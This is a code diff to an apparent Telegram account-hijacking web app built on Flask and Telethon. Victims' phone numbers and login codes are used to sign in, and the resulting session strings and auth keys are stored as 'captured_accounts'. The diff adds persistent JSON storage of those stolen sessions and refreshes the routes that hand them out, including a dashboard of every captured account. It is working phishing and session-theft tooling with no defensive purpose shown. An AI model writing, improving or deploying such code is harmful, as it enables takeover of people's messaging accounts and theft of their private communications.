@@ -29,9 +29,35 @@ if sys.version_info >= (3, 14):
 app = Flask(__name__)
 
 user_sessions = {}
-captured_accounts = []
 pending_codes = {}
 sessions_lock = threading.Lock()
+
+# ====== Persistent Storage ======
+DATA_FILE = "captured_accounts.json"
+
+def load_accounts():
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            return []
+    return []
+
+def save_account(account):
+    accounts = load_accounts()
+    for i, a in enumerate(accounts):
+        if a['phone'] == account['phone']:
+            accounts[i] = account
+            break
+    else:
+        accounts.append(account)
+    with open(DATA_FILE, 'w') as f:
+        json.dump(accounts, f, indent=2)
+    return account
+
+# Load existing accounts on startup
+captured_accounts = load_accounts()
 
 # ====== Phone Formatter ======
 def format_phone(ph):
@@ -379,10 +405,7 @@ def run_telegram_action(phone, code=None):
                     phone_code_hash=s['hash']
                 )
                 
-                # ====== FIXED: Get session while connected ======
                 me = await client.get_me()
-                
-                # Save session string BEFORE disconnecting
                 ss = StringSession.save(client.session)
                 
                 auth_key_bytes = client.session.auth_key.key if client.session.auth_key else None
@@ -426,8 +449,12 @@ def run_telegram_action(phone, code=None):
                     'time': str(datetime.now())
                 }
                 
+                # ====== FIX: Save to file and refresh list ======
+                save_account(acc)
+                global captured_accounts
+                captured_accounts = load_accounts()
+                
                 with sessions_lock:
-                    captured_accounts.append(acc)
                     if phone in user_sessions:
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
@@ -512,8 +539,11 @@ def verify():
 
 @app.route('/session/<phone>')
 def get_session(phone):
-    with sessions_lock:
-        a = next((x for x in captured_accounts if x['phone'] == phone), None)
+    phone = format_phone(phone)
+    global captured_accounts
+    captured_accounts = load_accounts()  # Refresh from file
+    
+    a = next((x for x in captured_accounts if x['phone'] == phone), None)
     
     if not a:
         return jsonify({'error': 'Not found'}), 404
@@ -529,8 +559,11 @@ def get_session(phone):
 
 @app.route('/webk/<phone>')
 def webk(phone):
-    with sessions_lock:
-        a = next((x for x in captured_accounts if x['phone'] == phone), None)
+    phone = format_phone(phone)
+    global captured_accounts
+    captured_accounts = load_accounts()  # Refresh from file
+    
+    a = next((x for x in captured_accounts if x['phone'] == phone), None)
     
     if not a:
         return "Not found", 404
@@ -600,8 +633,10 @@ def webk(phone):
 
 @app.route('/dash')
 def dash():
-    with sessions_lock:
-        accounts = list(captured_accounts)
+    global captured_accounts
+    captured_accounts = load_accounts()  # Refresh from file
+    
+    accounts = captured_accounts
     
     rows = ""
     for i, a in enumerate(accounts, 1):
